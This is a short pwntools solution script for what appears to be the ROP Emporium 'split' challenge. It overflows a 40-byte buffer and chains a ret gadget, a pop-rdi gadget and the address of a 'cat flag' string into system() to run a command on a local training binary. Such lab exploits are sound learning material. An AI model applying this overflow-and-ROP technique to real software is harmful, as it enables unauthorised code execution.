from pwn import*

p = process("./split")
gdb.attach(p, api=True)

strstr = 0x00601500
usefulFunction = 0x0000000000400742
ret = 0x000000000040053e
pop_rdi_ret = 0x00000000004007c3
system = 0x0000000000400560
read = 0x0000000000400590
printf = 0x0000000000400570
strings_cat_flag = 0x00601060
payload = b'a'*40 + p64(ret) + p64(pop_rdi_ret) + p64(strings_cat_flag) + p64(system)
p.sendline(payload)

p.interactive()
